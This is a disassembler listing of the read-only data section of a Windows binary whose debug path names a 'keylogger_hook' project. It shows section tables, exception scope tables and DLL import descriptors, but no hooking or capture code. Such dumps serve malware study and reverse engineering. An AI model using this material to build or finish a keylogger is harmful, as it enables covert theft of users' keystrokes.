.rdata:00402330 asc_402330      db 'RSDS'               ; DATA XREF: .rdata:00402264↑o
.rdata:00402330                                         ; CV signature
.rdata:00402334                 GUID <0B5247CF5h, 692Ah, 46BFh, <0BEh, 9Dh, 84h, 1Bh, 11h, 65h, 0CFh, \ ; GUID
.rdata:00402334                       71h>>
.rdata:00402344                 dd 6                    ; Age
.rdata:00402348                 text "UTF-8", 'C:\Users\aaa\source\repos\keylogger_hook\Release\keylo' ; PdbFileName
.rdata:0040237E                 text "UTF-8", 'gger_hook.pdb',0
.rdata:0040238C ; Debug information (IMAGE_DEBUG_TYPE_VC_FEATURE)
.rdata:0040238C unk_40238C      db    0                 ; DATA XREF: .rdata:00402280↑o
.rdata:0040238D                 db    0
.rdata:0040238E                 db    0
.rdata:0040238F                 db    0
.rdata:00402390                 db  20h
.rdata:00402391                 db    0
.rdata:00402392                 db    0
.rdata:00402393                 db    0
.rdata:00402394                 db  20h
.rdata:00402395                 db    0
.rdata:00402396                 db    0
.rdata:00402397                 db    0
.rdata:00402398                 db    1
.rdata:00402399                 db    0
.rdata:0040239A                 db    0
.rdata:0040239B                 db    0
.rdata:0040239C                 db  1Fh
.rdata:0040239D                 db    0
.rdata:0040239E                 db    0
.rdata:0040239F                 db    0
.rdata:004023A0 ; Debug information (IMAGE_DEBUG_TYPE_POGO)
.rdata:004023A0 aGctl           db 'GCTL',0             ; DATA XREF: .rdata:0040229C↑o
.rdata:004023A5                 db  10h
.rdata:004023A6                 db    0
.rdata:004023A7                 db    0
.rdata:004023A8                 db 0DDh
.rdata:004023A9                 db  0Eh
.rdata:004023AA                 db    0
.rdata:004023AB                 db    0
.rdata:004023AC                 db  2Eh ; .
.rdata:004023AD                 db  74h ; t
.rdata:004023AE                 db  65h ; e
.rdata:004023AF                 db  78h ; x
.rdata:004023B0                 db  74h ; t
.rdata:004023B1                 db  24h ; $
.rdata:004023B2                 db  6Dh ; m
.rdata:004023B3                 db  6Eh ; n
.rdata:004023B4                 db    0
.rdata:004023B5                 db    0
.rdata:004023B6                 db    0
.rdata:004023B7                 db    0
.rdata:004023B8                 db    0
.rdata:004023B9                 db  20h
.rdata:004023BA                 db    0
.rdata:004023BB                 db    0
.rdata:004023BC                 db 0F0h
.rdata:004023BD                 db    0
.rdata:004023BE                 db    0
.rdata:004023BF                 db    0
.rdata:004023C0                 db  2Eh ; .
.rdata:004023C1                 db  69h ; i
.rdata:004023C2                 db  64h ; d
.rdata:004023C3                 db  61h ; a
.rdata:004023C4                 db  74h ; t
.rdata:004023C5                 db  61h ; a
.rdata:004023C6                 db  24h ; $
.rdata:004023C7                 db  35h ; 5
.rdata:004023C8                 db    0
.rdata:004023C9                 db    0
.rdata:004023CA                 db    0
.rdata:004023CB                 db    0
.rdata:004023CC                 db 0F0h
.rdata:004023CD                 db  20h
.rdata:004023CE                 db    0
.rdata:004023CF                 db    0
.rdata:004023D0                 db    8
.rdata:004023D1                 db    0
.rdata:004023D2                 db    0
.rdata:004023D3                 db    0
.rdata:004023D4                 db  2Eh ; .
.rdata:004023D5                 db  30h ; 0
.rdata:004023D6                 db  30h ; 0
.rdata:004023D7                 db  63h ; c
.rdata:004023D8                 db  66h ; f
.rdata:004023D9                 db  67h ; g
.rdata:004023DA                 db    0
.rdata:004023DB                 db    0
.rdata:004023DC                 db 0F8h
.rdata:004023DD                 db  20h
.rdata:004023DE                 db    0
.rdata:004023DF                 db    0
.rdata:004023E0                 db    4
.rdata:004023E1                 db    0
.rdata:004023E2                 db    0
.rdata:004023E3                 db    0
.rdata:004023E4                 db  2Eh ; .
.rdata:004023E5                 db  43h ; C
.rdata:004023E6                 db  52h ; R
.rdata:004023E7                 db  54h ; T
.rdata:004023E8                 db  24h ; $
.rdata:004023E9                 db  58h ; X
.rdata:004023EA                 db  43h ; C
.rdata:004023EB                 db  41h ; A
.rdata:004023EC                 db    0
.rdata:004023ED                 db    0
.rdata:004023EE                 db    0
.rdata:004023EF                 db    0
.rdata:004023F0                 db 0FCh
.rdata:004023F1                 db  20h
.rdata:004023F2                 db    0
.rdata:004023F3                 db    0
.rdata:004023F4                 db    4
.rdata:004023F5                 db    0
.rdata:004023F6                 db    0
.rdata:004023F7                 db    0
.rdata:004023F8                 db  2Eh ; .
.rdata:004023F9                 db  43h ; C
.rdata:004023FA                 db  52h ; R
.rdata:004023FB                 db  54h ; T
.rdata:004023FC                 db  24h ; $
.rdata:004023FD                 db  58h ; X
.rdata:004023FE                 db  43h ; C
.rdata:004023FF                 db  41h ; A
.rdata:00402400                 db  41h ; A
.rdata:00402401                 db    0
.rdata:00402402                 db    0
.rdata:00402403                 db    0
.rdata:00402404                 db    0
.rdata:00402405                 db  21h ; !
.rdata:00402406                 db    0
.rdata:00402407                 db    0
.rdata:00402408                 db    4
.rdata:00402409                 db    0
.rdata:0040240A                 db    0
.rdata:0040240B                 db    0
.rdata:0040240C                 db  2Eh ; .
.rdata:0040240D                 db  43h ; C
.rdata:0040240E                 db  52h ; R
.rdata:0040240F                 db  54h ; T
.rdata:00402410                 db  24h ; $
.rdata:00402411                 db  58h ; X
.rdata:00402412                 db  43h ; C
.rdata:00402413                 db  5Ah ; Z
.rdata:00402414                 db    0
.rdata:00402415                 db    0
.rdata:00402416                 db    0
.rdata:00402417                 db    0
.rdata:00402418                 db    4
.rdata:00402419                 db  21h ; !
.rdata:0040241A                 db    0
.rdata:0040241B                 db    0
.rdata:0040241C                 db    4
.rdata:0040241D                 db    0
.rdata:0040241E                 db    0
.rdata:0040241F                 db    0
.rdata:00402420                 db  2Eh ; .
.rdata:00402421                 db  43h ; C
.rdata:00402422                 db  52h ; R
.rdata:00402423                 db  54h ; T
.rdata:00402424                 db  24h ; $
.rdata:00402425                 db  58h ; X
.rdata:00402426                 db  49h ; I
.rdata:00402427                 db  41h ; A
.rdata:00402428                 db    0
.rdata:00402429                 db    0
.rdata:0040242A                 db    0
.rdata:0040242B                 db    0
.rdata:0040242C                 db    8
.rdata:0040242D                 db  21h ; !
.rdata:0040242E                 db    0
.rdata:0040242F                 db    0
.rdata:00402430                 db    4
.rdata:00402431                 db    0
.rdata:00402432                 db    0
.rdata:00402433                 db    0
.rdata:00402434                 db  2Eh ; .
.rdata:00402435                 db  43h ; C
.rdata:00402436                 db  52h ; R
.rdata:00402437                 db  54h ; T
.rdata:00402438                 db  24h ; $
.rdata:00402439                 db  58h ; X
.rdata:0040243A                 db  49h ; I
.rdata:0040243B                 db  41h ; A
.rdata:0040243C                 db  41h ; A
.rdata:0040243D                 db    0
.rdata:0040243E                 db    0
.rdata:0040243F                 db    0
.rdata:00402440                 db  0Ch
.rdata:00402441                 db  21h ; !
.rdata:00402442                 db    0
.rdata:00402443                 db    0
.rdata:00402444                 db    4
.rdata:00402445                 db    0
.rdata:00402446                 db    0
.rdata:00402447                 db    0
.rdata:00402448                 db  2Eh ; .
.rdata:00402449                 db  43h ; C
.rdata:0040244A                 db  52h ; R
.rdata:0040244B                 db  54h ; T
.rdata:0040244C                 db  24h ; $
.rdata:0040244D                 db  58h ; X
.rdata:0040244E                 db  49h ; I
.rdata:0040244F                 db  41h ; A
.rdata:00402450                 db  43h ; C
.rdata:00402451                 db    0
.rdata:00402452                 db    0
.rdata:00402453                 db    0
.rdata:00402454                 db  10h
.rdata:00402455                 db  21h ; !
.rdata:00402456                 db    0
.rdata:00402457                 db    0
.rdata:00402458                 db    4
.rdata:00402459                 db    0
.rdata:0040245A                 db    0
.rdata:0040245B                 db    0
.rdata:0040245C                 db  2Eh ; .
.rdata:0040245D                 db  43h ; C
.rdata:0040245E                 db  52h ; R
.rdata:0040245F                 db  54h ; T
.rdata:00402460                 db  24h ; $
.rdata:00402461                 db  58h ; X
.rdata:00402462                 db  49h ; I
.rdata:00402463                 db  5Ah ; Z
.rdata:00402464                 db    0
.rdata:00402465                 db    0
.rdata:00402466                 db    0
.rdata:00402467                 db    0
.rdata:00402468                 db  14h
.rdata:00402469                 db  21h ; !
.rdata:0040246A                 db    0
.rdata:0040246B                 db    0
.rdata:0040246C                 db    4
.rdata:0040246D                 db    0
.rdata:0040246E                 db    0
.rdata:0040246F                 db    0
.rdata:00402470                 db  2Eh ; .
.rdata:00402471                 db  43h ; C
.rdata:00402472                 db  52h ; R
.rdata:00402473                 db  54h ; T
.rdata:00402474                 db  24h ; $
.rdata:00402475                 db  58h ; X
.rdata:00402476                 db  50h ; P
.rdata:00402477                 db  41h ; A
.rdata:00402478                 db    0
.rdata:00402479                 db    0
.rdata:0040247A                 db    0
.rdata:0040247B                 db    0
.rdata:0040247C                 db  18h
.rdata:0040247D                 db  21h ; !
.rdata:0040247E                 db    0
.rdata:0040247F                 db    0
.rdata:00402480                 db    4
.rdata:00402481                 db    0
.rdata:00402482                 db    0
.rdata:00402483                 db    0
.rdata:00402484                 db  2Eh ; .
.rdata:00402485                 db  43h ; C
.rdata:00402486                 db  52h ; R
.rdata:00402487                 db  54h ; T
.rdata:00402488                 db  24h ; $
.rdata:00402489                 db  58h ; X
.rdata:0040248A                 db  50h ; P
.rdata:0040248B                 db  5Ah ; Z
.rdata:0040248C                 db    0
.rdata:0040248D                 db    0
.rdata:0040248E                 db    0
.rdata:0040248F                 db    0
.rdata:00402490                 db  1Ch
.rdata:00402491                 db  21h ; !
.rdata:00402492                 db    0
.rdata:00402493                 db    0
.rdata:00402494                 db    4
.rdata:00402495                 db    0
.rdata:00402496                 db    0
.rdata:00402497                 db    0
.rdata:00402498                 db  2Eh ; .
.rdata:00402499                 db  43h ; C
.rdata:0040249A                 db  52h ; R
.rdata:0040249B                 db  54h ; T
.rdata:0040249C                 db  24h ; $
.rdata:0040249D                 db  58h ; X
.rdata:0040249E                 db  54h ; T
.rdata:0040249F                 db  41h ; A
.rdata:004024A0                 db    0
.rdata:004024A1                 db    0
.rdata:004024A2                 db    0
.rdata:004024A3                 db    0
.rdata:004024A4                 db  20h
.rdata:004024A5                 db  21h ; !
.rdata:004024A6                 db    0
.rdata:004024A7                 db    0
.rdata:004024A8                 db    8
.rdata:004024A9                 db    0
.rdata:004024AA                 db    0
.rdata:004024AB                 db    0
.rdata:004024AC                 db  2Eh ; .
.rdata:004024AD                 db  43h ; C
.rdata:004024AE                 db  52h ; R
.rdata:004024AF                 db  54h ; T
.rdata:004024B0                 db  24h ; $
.rdata:004024B1                 db  58h ; X
.rdata:004024B2                 db  54h ; T
.rdata:004024B3                 db  5Ah ; Z
.rdata:004024B4                 db    0
.rdata:004024B5                 db    0
.rdata:004024B6                 db    0
.rdata:004024B7                 db    0
.rdata:004024B8                 db  28h ; (
.rdata:004024B9                 db  21h ; !
.rdata:004024BA                 db    0
.rdata:004024BB                 db    0
.rdata:004024BC                 db  98h
.rdata:004024BD                 db    1
.rdata:004024BE                 db    0
.rdata:004024BF                 db    0
.rdata:004024C0                 db  2Eh ; .
.rdata:004024C1                 db  72h ; r
.rdata:004024C2                 db  64h ; d
.rdata:004024C3                 db  61h ; a
.rdata:004024C4                 db  74h ; t
.rdata:004024C5                 db  61h ; a
.rdata:004024C6                 db    0
.rdata:004024C7                 db    0
.rdata:004024C8                 db 0C0h
.rdata:004024C9                 db  22h ; "
.rdata:004024CA                 db    0
.rdata:004024CB                 db    0
.rdata:004024CC                 db    4
.rdata:004024CD                 db    0
.rdata:004024CE                 db    0
.rdata:004024CF                 db    0
.rdata:004024D0                 db  2Eh ; .
.rdata:004024D1                 db  72h ; r
.rdata:004024D2                 db  64h ; d
.rdata:004024D3                 db  61h ; a
.rdata:004024D4                 db  74h ; t
.rdata:004024D5                 db  61h ; a
.rdata:004024D6                 db  24h ; $
.rdata:004024D7                 db  73h ; s
.rdata:004024D8                 db  78h ; x
.rdata:004024D9                 db  64h ; d
.rdata:004024DA                 db  61h ; a
.rdata:004024DB                 db  74h ; t
.rdata:004024DC                 db  61h ; a
.rdata:004024DD                 db    0
.rdata:004024DE                 db    0
.rdata:004024DF                 db    0
.rdata:004024E0                 db 0C4h
.rdata:004024E1                 db  22h ; "
.rdata:004024E2                 db    0
.rdata:004024E3                 db    0
.rdata:004024E4                 db  6Ch ; l
.rdata:004024E5                 db    0
.rdata:004024E6                 db    0
.rdata:004024E7                 db    0
.rdata:004024E8                 db  2Eh ; .
.rdata:004024E9                 db  72h ; r
.rdata:004024EA                 db  64h ; d
.rdata:004024EB                 db  61h ; a
.rdata:004024EC                 db  74h ; t
.rdata:004024ED                 db  61h ; a
.rdata:004024EE                 db  24h ; $
.rdata:004024EF                 db  76h ; v
.rdata:004024F0                 db  6Fh ; o
.rdata:004024F1                 db  6Ch ; l
.rdata:004024F2                 db  74h ; t
.rdata:004024F3                 db  6Dh ; m
.rdata:004024F4                 db  64h ; d
.rdata:004024F5                 db    0
.rdata:004024F6                 db    0
.rdata:004024F7                 db    0
.rdata:004024F8                 db  30h ; 0
.rdata:004024F9                 db  23h ; #
.rdata:004024FA                 db    0
.rdata:004024FB                 db    0
.rdata:004024FC                 db 0DCh
.rdata:004024FD                 db    2
.rdata:004024FE                 db    0
.rdata:004024FF                 db    0
.rdata:00402500                 db  2Eh ; .
.rdata:00402501                 db  72h ; r
.rdata:00402502                 db  64h ; d
.rdata:00402503                 db  61h ; a
.rdata:00402504                 db  74h ; t
.rdata:00402505                 db  61h ; a
.rdata:00402506                 db  24h ; $
.rdata:00402507                 db  7Ah ; z
.rdata:00402508                 db  7Ah ; z
.rdata:00402509                 db  7Ah ; z
.rdata:0040250A                 db  64h ; d
.rdata:0040250B                 db  62h ; b
.rdata:0040250C                 db  67h ; g
.rdata:0040250D                 db    0
.rdata:0040250E                 db    0
.rdata:0040250F                 db    0
.rdata:00402510                 db  0Ch
.rdata:00402511                 db  26h ; &
.rdata:00402512                 db    0
.rdata:00402513                 db    0
.rdata:00402514                 db    4
.rdata:00402515                 db    0
.rdata:00402516                 db    0
.rdata:00402517                 db    0
.rdata:00402518                 db  2Eh ; .
.rdata:00402519                 db  72h ; r
.rdata:0040251A                 db  74h ; t
.rdata:0040251B                 db  63h ; c
.rdata:0040251C                 db  24h ; $
.rdata:0040251D                 db  49h ; I
.rdata:0040251E                 db  41h ; A
.rdata:0040251F                 db  41h ; A
.rdata:00402520                 db    0
.rdata:00402521                 db    0
.rdata:00402522                 db    0
.rdata:00402523                 db    0
.rdata:00402524                 db  10h
.rdata:00402525                 db  26h ; &
.rdata:00402526                 db    0
.rdata:00402527                 db    0
.rdata:00402528                 db    4
.rdata:00402529                 db    0
.rdata:0040252A                 db    0
.rdata:0040252B                 db    0
.rdata:0040252C                 db  2Eh ; .
.rdata:0040252D                 db  72h ; r
.rdata:0040252E                 db  74h ; t
.rdata:0040252F                 db  63h ; c
.rdata:00402530                 db  24h ; $
.rdata:00402531                 db  49h ; I
.rdata:00402532                 db  5Ah ; Z
.rdata:00402533                 db  5Ah ; Z
.rdata:00402534                 db    0
.rdata:00402535                 db    0
.rdata:00402536                 db    0
.rdata:00402537                 db    0
.rdata:00402538                 db  14h
.rdata:00402539                 db  26h ; &
.rdata:0040253A                 db    0
.rdata:0040253B                 db    0
.rdata:0040253C                 db    4
.rdata:0040253D                 db    0
.rdata:0040253E                 db    0
.rdata:0040253F                 db    0
.rdata:00402540                 db  2Eh ; .
.rdata:00402541                 db  72h ; r
.rdata:00402542                 db  74h ; t
.rdata:00402543                 db  63h ; c
.rdata:00402544                 db  24h ; $
.rdata:00402545                 db  54h ; T
.rdata:00402546                 db  41h ; A
.rdata:00402547                 db  41h ; A
.rdata:00402548                 db    0
.rdata:00402549                 db    0
.rdata:0040254A                 db    0
.rdata:0040254B                 db    0
.rdata:0040254C                 db  18h
.rdata:0040254D                 db  26h ; &
.rdata:0040254E                 db    0
.rdata:0040254F                 db    0
.rdata:00402550                 db    8
.rdata:00402551                 db    0
.rdata:00402552                 db    0
.rdata:00402553                 db    0
.rdata:00402554                 db  2Eh ; .
.rdata:00402555                 db  72h ; r
.rdata:00402556                 db  74h ; t
.rdata:00402557                 db  63h ; c
.rdata:00402558                 db  24h ; $
.rdata:00402559                 db  54h ; T
.rdata:0040255A                 db  5Ah ; Z
.rdata:0040255B                 db  5Ah ; Z
.rdata:0040255C                 db    0
.rdata:0040255D                 db    0
.rdata:0040255E                 db    0
.rdata:0040255F                 db    0
.rdata:00402560                 db  20h
.rdata:00402561                 db  26h ; &
.rdata:00402562                 db    0
.rdata:00402563                 db    0
.rdata:00402564                 db  3Ch ; <
.rdata:00402565                 db    0
.rdata:00402566                 db    0
.rdata:00402567                 db    0
.rdata:00402568                 db  2Eh ; .
.rdata:00402569                 db  78h ; x
.rdata:0040256A                 db  64h ; d
.rdata:0040256B                 db  61h ; a
.rdata:0040256C                 db  74h ; t
.rdata:0040256D                 db  61h ; a
.rdata:0040256E                 db  24h ; $
.rdata:0040256F                 db  78h ; x
.rdata:00402570                 db    0
.rdata:00402571                 db    0
.rdata:00402572                 db    0
.rdata:00402573                 db    0
.rdata:00402574                 db  5Ch ; \
.rdata:00402575                 db  26h ; &
.rdata:00402576                 db    0
.rdata:00402577                 db    0
.rdata:00402578                 db 0A0h
.rdata:00402579                 db    0
.rdata:0040257A                 db    0
.rdata:0040257B                 db    0
.rdata:0040257C                 db  2Eh ; .
.rdata:0040257D                 db  69h ; i
.rdata:0040257E                 db  64h ; d
.rdata:0040257F                 db  61h ; a
.rdata:00402580                 db  74h ; t
.rdata:00402581                 db  61h ; a
.rdata:00402582                 db  24h ; $
.rdata:00402583                 db  32h ; 2
.rdata:00402584                 db    0
.rdata:00402585                 db    0
.rdata:00402586                 db    0
.rdata:00402587                 db    0
.rdata:00402588                 db 0FCh
.rdata:00402589                 db  26h ; &
.rdata:0040258A                 db    0
.rdata:0040258B                 db    0
.rdata:0040258C                 db  14h
.rdata:0040258D                 db    0
.rdata:0040258E                 db    0
.rdata:0040258F                 db    0
.rdata:00402590                 db  2Eh ; .
.rdata:00402591                 db  69h ; i
.rdata:00402592                 db  64h ; d
.rdata:00402593                 db  61h ; a
.rdata:00402594                 db  74h ; t
.rdata:00402595                 db  61h ; a
.rdata:00402596                 db  24h ; $
.rdata:00402597                 db  33h ; 3
.rdata:00402598                 db    0
.rdata:00402599                 db    0
.rdata:0040259A                 db    0
.rdata:0040259B                 db    0
.rdata:0040259C                 db  10h
.rdata:0040259D                 db  27h ; '
.rdata:0040259E                 db    0
.rdata:0040259F                 db    0
.rdata:004025A0                 db 0F0h
.rdata:004025A1                 db    0
.rdata:004025A2                 db    0
.rdata:004025A3                 db    0
.rdata:004025A4                 db  2Eh ; .
.rdata:004025A5                 db  69h ; i
.rdata:004025A6                 db  64h ; d
.rdata:004025A7                 db  61h ; a
.rdata:004025A8                 db  74h ; t
.rdata:004025A9                 db  61h ; a
.rdata:004025AA                 db  24h ; $
.rdata:004025AB                 db  34h ; 4
.rdata:004025AC                 db    0
.rdata:004025AD                 db    0
.rdata:004025AE                 db    0
.rdata:004025AF                 db    0
.rdata:004025B0                 db    0
.rdata:004025B1                 db  28h ; (
.rdata:004025B2                 db    0
.rdata:004025B3                 db    0
.rdata:004025B4                 db 0B0h
.rdata:004025B5                 db    4
.rdata:004025B6                 db    0
.rdata:004025B7                 db    0
.rdata:004025B8                 db  2Eh ; .
.rdata:004025B9                 db  69h ; i
.rdata:004025BA                 db  64h ; d
.rdata:004025BB                 db  61h ; a
.rdata:004025BC                 db  74h ; t
.rdata:004025BD                 db  61h ; a
.rdata:004025BE                 db  24h ; $
.rdata:004025BF                 db  36h ; 6
.rdata:004025C0                 db    0
.rdata:004025C1                 db    0
.rdata:004025C2                 db    0
.rdata:004025C3                 db    0
.rdata:004025C4                 db    0
.rdata:004025C5                 db  30h ; 0
.rdata:004025C6                 db    0
.rdata:004025C7                 db    0
.rdata:004025C8                 db  60h ; `
.rdata:004025C9                 db    0
.rdata:004025CA                 db    0
.rdata:004025CB                 db    0
.rdata:004025CC                 db  2Eh ; .
.rdata:004025CD                 db  64h ; d
.rdata:004025CE                 db  61h ; a
.rdata:004025CF                 db  74h ; t
.rdata:004025D0                 db  61h ; a
.rdata:004025D1                 db    0
.rdata:004025D2                 db    0
.rdata:004025D3                 db    0
.rdata:004025D4                 db  60h ; `
.rdata:004025D5                 db  30h ; 0
.rdata:004025D6                 db    0
.rdata:004025D7                 db    0
.rdata:004025D8                 db  7Ch ; |
.rdata:004025D9                 db    3
.rdata:004025DA                 db    0
.rdata:004025DB                 db    0
.rdata:004025DC                 db  2Eh ; .
.rdata:004025DD                 db  62h ; b
.rdata:004025DE                 db  73h ; s
.rdata:004025DF                 db  73h ; s
.rdata:004025E0                 db    0
.rdata:004025E1                 db    0
.rdata:004025E2                 db    0
.rdata:004025E3                 db    0
.rdata:004025E4                 db    0
.rdata:004025E5                 db  40h ; @
.rdata:004025E6                 db    0
.rdata:004025E7                 db    0
.rdata:004025E8                 db  60h ; `
.rdata:004025E9                 db    0
.rdata:004025EA                 db    0
.rdata:004025EB                 db    0
.rdata:004025EC                 db  2Eh ; .
.rdata:004025ED                 db  72h ; r
.rdata:004025EE                 db  73h ; s
.rdata:004025EF                 db  72h ; r
.rdata:004025F0                 db  63h ; c
.rdata:004025F1                 db  24h ; $
.rdata:004025F2                 db  30h ; 0
.rdata:004025F3                 db  31h ; 1
.rdata:004025F4                 db    0
.rdata:004025F5                 db    0
.rdata:004025F6                 db    0
.rdata:004025F7                 db    0
.rdata:004025F8                 db  60h ; `
.rdata:004025F9                 db  40h ; @
.rdata:004025FA                 db    0
.rdata:004025FB                 db    0
.rdata:004025FC                 db  80h
.rdata:004025FD                 db    1
.rdata:004025FE                 db    0
.rdata:004025FF                 db    0
.rdata:00402600                 db  2Eh ; .
.rdata:00402601                 db  72h ; r
.rdata:00402602                 db  73h ; s
.rdata:00402603                 db  72h ; r
.rdata:00402604                 db  63h ; c
.rdata:00402605                 db  24h ; $
.rdata:00402606                 db  30h ; 0
.rdata:00402607                 db  32h ; 2
.rdata:00402608                 db    0
.rdata:00402609                 db    0
.rdata:0040260A                 db    0
.rdata:0040260B                 db    0
.rdata:0040260C                 db    0
.rdata:0040260D                 db    0
.rdata:0040260E                 db    0
.rdata:0040260F                 db    0
.rdata:00402610 unk_402610      db    0                 ; DATA XREF: sub_4019AC+2↑o
.rdata:00402610                                         ; sub_4019AC+7↑o
.rdata:00402611                 db    0
.rdata:00402612                 db    0
.rdata:00402613                 db    0
.rdata:00402614                 db    0
.rdata:00402615                 db    0
.rdata:00402616                 db    0
.rdata:00402617                 db    0
.rdata:00402618 unk_402618      db    0                 ; DATA XREF: sub_4019D8+2↑o
.rdata:00402618                                         ; sub_4019D8+7↑o
.rdata:00402619                 db    0
.rdata:0040261A                 db    0
.rdata:0040261B                 db    0
.rdata:0040261C                 db    0
.rdata:0040261D                 db    0
.rdata:0040261E                 db    0
.rdata:0040261F                 db    0
.rdata:00402620 stru_402620     _EH4_SCOPETABLE <0FFFFFFFEh, 0, 0FFFFFFCCh, 0, <0FFFFFFFEh, \
.rdata:00402620                                         ; DATA XREF: __scrt_common_main_seh(void)+2↑o
.rdata:00402620                                  offset loc_4012F4, offset loc_401308>>
.rdata:0040263C                 align 10h
.rdata:00402640 stru_402640     _EH4_SCOPETABLE <0FFFFFFFEh, 0, 0FFFFFFD8h, 0, <0FFFFFFFEh, \
.rdata:00402640                                         ; DATA XREF: ___scrt_is_nonwritable_in_current_image+2↑o
.rdata:00402640                                  offset loc_401617, offset loc_40162A>>
.rdata:0040265C __IMPORT_DESCRIPTOR_KERNEL32 dd rva off_402710 ; Import Name Table
.rdata:00402660                 dd 0                    ; Time stamp
.rdata:00402664                 dd 0                    ; Forwarder Chain
.rdata:00402668                 dd rva aKernel32Dll     ; DLL Name
.rdata:0040266C                 dd rva AllocConsole     ; Import Address Table
.rdata:00402670 __IMPORT_DESCRIPTOR_USER32 dd rva off_402748 ; Import Name Table
.rdata:00402674                 dd 0                    ; Time stamp
.rdata:00402678                 dd 0                    ; Forwarder Chain
.rdata:0040267C                 dd rva aUser32Dll       ; DLL Name
.rdata:00402680                 dd rva ShowWindow       ; Import Address Table
.rdata:00402684 __IMPORT_DESCRIPTOR_VCRUNTIME140 dd rva off_402768 ; Import Name Table
.rdata:00402688                 dd 0                    ; Time stamp
.rdata:0040268C                 dd 0                    ; Forwarder Chain
.rdata:00402690                 dd rva aVcruntime140Dl  ; DLL Name
.rdata:00402694                 dd rva __imp__except_handler4_common ; Import Address Table
.rdata:00402698                 dd rva off_4027E4       ; Import Name Table
.rdata:0040269C                 dd 0                    ; Time stamp
.rdata:004026A0                 dd 0                    ; Forwarder Chain
.rdata:004026A4                 dd rva aApiMsWinCrtStd  ; DLL Name
.rdata:004026A8                 dd rva __imp__set_fmode ; Import Address Table
.rdata:004026AC                 dd rva off_402794       ; Import Name Table
.rdata:004026B0                 dd 0                    ; Time stamp
.rdata:004026B4                 dd 0                    ; Forwarder Chain
.rdata:004026B8                 dd rva aApiMsWinCrtRun  ; DLL Name
.rdata:004026BC                 dd rva __imp__get_initial_narrow_environment ; Import Address Table
.rdata:004026C0                 dd rva off_40278C       ; Import Name Table
.rdata:004026C4                 dd 0                    ; Time stamp
.rdata:004026C8                 dd 0                    ; Forwarder Chain
.rdata:004026CC                 dd rva aApiMsWinCrtMat  ; DLL Name
.rdata:004026D0                 dd rva __imp___setusermatherr ; Import Address Table
.rdata:004026D4                 dd rva off_402784       ; Import Name Table
.rdata:004026D8                 dd 0                    ; Time stamp
.rdata:004026DC                 dd 0                    ; Forwarder Chain
.rdata:004026E0                 dd rva aApiMsWinCrtLoc  ; DLL Name
.rdata:004026E4                 dd rva __imp__configthreadlocale ; Import Address Table
.rdata:004026E8                 dd rva off_40277C       ; Import Name Table
.rdata:004026EC                 dd 0                    ; Time stamp
.rdata:004026F0                 dd 0                    ; Forwarder Chain
.rdata:004026F4                 dd rva aApiMsWinCrtHea  ; DLL Name
.rdata:004026F8                 dd rva __imp__set_new_mode ; Import Address Table
.rdata:004026FC                 db    0
.rdata:004026FD                 db    0
.rdata:004026FE                 db    0
.rdata:004026FF                 db    0
.rdata:00402700                 db    0
.rdata:00402701                 db    0
.rdata:00402702                 db    0
.rdata:00402703                 db    0
.rdata:00402704                 db    0
.rdata:00402705                 db    0
.rdata:00402706                 db    0
.rdata:00402707                 db    0
.rdata:00402708                 db    0
.rdata:00402709                 db    0
.rdata:0040270A                 db    0
.rdata:0040270B                 db    0
.rdata:0040270C                 db    0
.rdata:0040270D                 db    0
.rdata:0040270E                 db    0
.rdata:0040270F                 db    0
.rdata:00402710 ;
.rdata:00402710 ; Import names for KERNEL32.dll
.rdata:00402710 ;
.rdata:00402710 off_402710      dd rva word_402800      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32↑o
.rdata:00402714                 dd rva word_402C88
.rdata:00402718                 dd rva word_402C72
.rdata:0040271C                 dd rva word_402C58
.rdata:00402720                 dd rva word_402C42
.rdata:00402724                 dd rva word_402C2C
.rdata:00402728                 dd rva word_402C12
.rdata:0040272C                 dd rva word_402BF6
.rdata:00402730                 dd rva word_402BE2
.rdata:00402734                 dd rva word_402BCE
.rdata:00402738                 dd rva word_402BB0
.rdata:0040273C                 dd rva word_402B94
.rdata:00402740                 dd rva word_402C9C
.rdata:00402744                 dd 0
.rdata:00402748 ;
.rdata:00402748 ; Import names for USER32.dll
.rdata:00402748 ;
.rdata:00402748 off_402748      dd rva word_402868      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32↑o
.rdata:0040274C                 dd rva word_402854
.rdata:00402750                 dd rva word_40281E
.rdata:00402754                 dd rva word_40282C
.rdata:00402758                 dd rva word_402840
.rdata:0040275C                 dd rva word_402876
.rdata:00402760                 dd rva word_402888
.rdata:00402764                 dd 0
.rdata:00402768 ;
.rdata:00402768 ; Import names for VCRUNTIME140.dll
.rdata:00402768 ;
.rdata:00402768 off_402768      dd rva word_4028E0      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_VCRUNTIME140↑o
.rdata:0040276C                 dd rva word_4028D6
.rdata:00402770                 dd rva word_4028B8
.rdata:00402774                 dd rva word_4028A2
.rdata:00402778                 dd 0
.rdata:0040277C ;
.rdata:0040277C ; Import names for api-ms-win-crt-heap-l1-1-0.dll
.rdata:0040277C ;
.rdata:0040277C off_40277C      dd rva word_402A6E      ; DATA XREF: .rdata:004026E8↑o
.rdata:00402780                 dd 0
.rdata:00402784 ;
.rdata:00402784 ; Import names for api-ms-win-crt-locale-l1-1-0.dll
.rdata:00402784 ;
.rdata:00402784 off_402784      dd rva word_402A58      ; DATA XREF: .rdata:004026D4↑o
.rdata:00402788                 dd 0
.rdata:0040278C ;
.rdata:0040278C ; Import names for api-ms-win-crt-math-l1-1-0.dll
.rdata:0040278C ;
.rdata:0040278C off_40278C      dd rva word_402950      ; DATA XREF: .rdata:004026C0↑o
.rdata:00402790                 dd 0
.rdata:00402794 ;
.rdata:00402794 ; Import names for api-ms-win-crt-runtime-l1-1-0.dll
.rdata:00402794 ;
.rdata:00402794 off_402794      dd rva word_4029A0      ; DATA XREF: .rdata:004026AC↑o
.rdata:00402798                 dd rva word_402A20
.rdata:0040279C                 dd rva word_4029CE
.rdata:004027A0                 dd rva word_40297E
.rdata:004027A4                 dd rva word_402A16
.rdata:004027A8                 dd rva word_402AAA
.rdata:004027AC                 dd rva word_402AC6
.rdata:004027B0                 dd rva word_402AD4
.rdata:004027B4                 dd rva word_402AE4
.rdata:004027B8                 dd rva word_402964
.rdata:004027BC                 dd rva word_4029C2
.rdata:004027C0                 dd rva word_4029E4
.rdata:004027C4                 dd rva word_4029FA
.rdata:004027C8                 dd rva word_402A8E
.rdata:004027CC                 dd rva word_402940
.rdata:004027D0                 dd rva word_40292E
.rdata:004027D4                 dd rva word_4029DC
